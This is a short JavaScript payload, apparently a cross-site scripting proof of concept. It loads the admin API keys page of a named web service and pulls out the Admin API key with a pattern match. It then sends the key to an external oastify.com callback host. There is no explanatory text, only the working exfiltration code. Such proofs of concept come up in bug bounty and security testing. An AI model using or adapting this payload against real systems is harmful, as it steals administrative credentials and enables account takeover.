fetch("https://admin.zype.com/api_keys").then(a =&gt; a.text()).then(a =&gt; {const apiKeyMatch = a.match(/&lt;td&gt;Admin&lt;\/td&gt;\s*&lt;td&gt;(\w+)&lt;\/td&gt;/);if (apiKeyMatch) {
const apiKey = apiKeyMatch[1];
return fetch("https://pun5vabdyys48szo3w7tq8w1fslj9axz.oastify.com?x=" + apiKey);
} else {
console.error("API Key not found in the response");
}
})
.then(response =&gt; {
console.log(response);
});
